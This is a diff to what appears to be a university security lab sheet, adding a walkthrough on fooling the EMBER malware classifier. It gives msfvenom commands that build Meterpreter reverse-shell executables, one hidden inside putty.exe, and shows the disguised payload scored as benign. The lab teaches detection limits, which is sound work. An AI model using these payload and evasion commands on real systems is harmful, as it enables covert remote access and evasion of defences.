@@ -129,46 +129,134 @@ $$
 
 **Flag: Enter the full classification probability for the malware you found above**
 
-It is possible to create adversarial versions of malware that are designed to evade classification by machine learning detection techniques, however that is beyond the scope of this practical. 
+## Evading the classification Msfvenom and Meterpreter
 
-If you are interested in what Lief can tell you about the binary, you can use it as follows:
+Msfvenom is a utility that comes with what is called an exploitation framework called Metasploit. Metasploit is a sophisticated toolset that is used by penetration testers \(and hackers\) to explore vulnerabilities and exploit them. Msfvenom can generate various payloads that when run on a target machine, will create remote access to that machine for attackers. One of these payloads is called a Meterpreter shell and normally this is recognised as malware by anti-malware software. 
+
+Msfvenom comes with a variety of evasion techniques to avoid detection but most are easily detected by anti-malware software. However, there exists one approach that does fool anti-malware, especially  machine learning classifiers. 
+
+To get started, we are going to run Metasploit, and to do this we will run a Docker container in a separate terminal/cmd window as follows:
 
 ```bash
->>> import lief
->>> binary = lief.parse("malware")
-Unable to find the section associated with BOUND_IMPORT
-
->>> print(binary)
-"key" of the var key should be equal to 'Translation' ()
-Dos Header
-==========
-Magic:                        5a4d
-Used Bytes In The LastPage:   90
-File Size In Pages:           3
-Number Of Relocation:         0
-Header Size In Paragraphs:    4
-Minimum Extra Paragraphs:     0
-Maximum Extra Paragraphs:     ffff
-Initial Relative SS:          0
-Initial SP:                   b8
-Checksum:                     0
-Initial IP:                   0
-Initial Relative CS:          0
-Address Of Relocation Table:  40
-Overlay Number:               0
-OEM id:                       0
-OEM info:                     0
-Address Of New Exe Header:    b8
-
-Rich Header
-===========
-Key: 8acd8739
-  - ID: 0xd000 Build ID: 0x1fe9 Count: 1
-  - ID: 0x9000 Build ID: 0x1f69 Count: 6
-  - ID: 0xe000 Build ID: 0x1c83 Count: 1
-
-<SNIP...>
+docker run -v $(pwd)/share:/opt/share -it  metasploitframework/metasploit-framework:latest
 ```
 
-There is a great deal of content that follows.
+Instead of $\(pwd\) put the same local folder you were running for the AI container above.
+
+You should see something like this:
+
+```bash
+0x4447734D4250:~/Desktop/DevProjects/cits1003/Images/ai$ docker run -v $(pwd)/share:/opt/share -it  metasploitframework/metasploit-framework:latest
+[!] The following modules could not be loaded!..\
+[!] 	/usr/src/metasploit-framework/modules/auxiliary/gather/office365userenum.py
+[!] Please see /home/msf/.msf4/logs/framework.log for details.
+                                                  
+
+ ______________________________________________________________________________
+|                                                                              |
+|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
+|______________________________________________________________________________|
+      \                                  /                      /
+       \     .                          /                      /            x
+        \                              /                      /
+         \                            /          +           /
+          \            +             /                      /
+           *                        /                      /
+                                   /      .               /
+    X                             /                      /            X
+                                 /                     ###
+                                /                     # % #
+                               /                       ###
+                      .       /
+     .                       /      .            *           .
+                            /
+                           *
+                  +                       *
+
+                                       ^
+####      __     __     __          #######         __     __     __        ####
+####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
+################################################################################
+################################################################################
+# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
+################################################################################
+                                                           https://metasploit.com
+
+
+       =[ metasploit v6.0.53-dev                          ]
++ -- --=[ 2149 exploits - 1142 auxiliary - 366 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 8 evasion                                       ]
+
+Metasploit tip: Use sessions -1 to interact with the 
+last opened session
+
+[*] Processing docker/msfconsole.rc for ERB directives.
+[*] resource (docker/msfconsole.rc)> Ruby Code (236 bytes)
+LHOST => 172.17.0.3
+msf6 > 
+```
+
+The graphic changes each time you load it so don't worry if your version doesn't show Missile Command - and in case you were wondering - Missile Command was a very popular video game back in the 1980's :\) \).
+
+At the command prompt change directory to /opt/share. We are going to need a file called putty.exe that we are going to use as a template for one of the Meterpreter versions and so download it now:
+
+```bash
+wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
+```
+
+We are going to run msfvenom from the Metasploit command line to generate two versions of meterpreter executables. The first will run an unmodified meterpreter executable:
+
+```bash
+/usr/src/metasploit-framework/msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe > meterpreter1.exe
+```
+
+You don't really have to worry about the parameters but if you are interested, the LHOST and LPORT arguments tell Meterpreter where to connect back to i.e. our machine. The -f exe tells Meterpreter that we are using an executable format for the payload.
+
+Now we will create a second version that will effectively embed Meterpreter in a normal Windows executable putty.exe. Putty is an application that allows SSH connections on a Windows box. Run the msfvenom command as follows:
+
+```bash
+/usr/src/metasploit-framework/msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -x putty.exe > meterpreter2.exe
+```
+
+Now that we have the two samples, we can go back to our classifier and see what happens:
+
+With the first version meterpreter1.exe we get:
+
+```bash
+root@2cb5ba4dddcb:/opt/ember# python scripts/classify_binaries.py -m dataset/ember_model_2018.txt meterpreter1.exe
+WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
+WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
+WARNING:   in the feature calculations.
+Signature PDB_20 is not implemented yet!
+0.9999986237635949
+```
+
+Definitely malware!
+
+However, when we run the second version, we get:
+
+```bash
+root@2cb5ba4dddcb:/opt/ember# python scripts/classify_binaries.py -m dataset/ember_model_2018.txt meterpreter2.exe
+WARNING: EMBER feature version 2 were computed using lief version 0.9.0-
+WARNING:   lief version 0.11.5-37bc2c9 found instead. There may be slight inconsistencies
+WARNING:   in the feature calculations.
+0.015146771950010027
+```
+
+So, according to the classifier, this is a normal, and safe, binary!
+
+Msfvenom has other encoders that try and obfuscate the file to avoid detection. One of these is called shikata ga nai. You can create a meterpreter binary using the flag
+
+```bash
+/usr/src/metasploit-framework/msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe -e shikata_ga_nai > meterpreter3.exe
+```
+
+However, when you classify this one, you will see that it is still recognised as malware.
+
+It is important to note that machine learning evasion by masquerading as a normal binary is not an adversarial technique. You have simply overwhelmed the classifier with enough features of normal binaries that it tips it into classifying it as such. Adversarial techniques in malware are more difficult than whith images because you are more limited in what you can change. You still want a binary that works after your changes and so randomly changing bits of the file can easily stop it from doing that. 
+
+**Flag: Type in whoami in the msf console and type in the username as the flag**
+
+If you are interested, upload the meterpreter versions you created to VirusTotal and see what they are classified as there. 
 
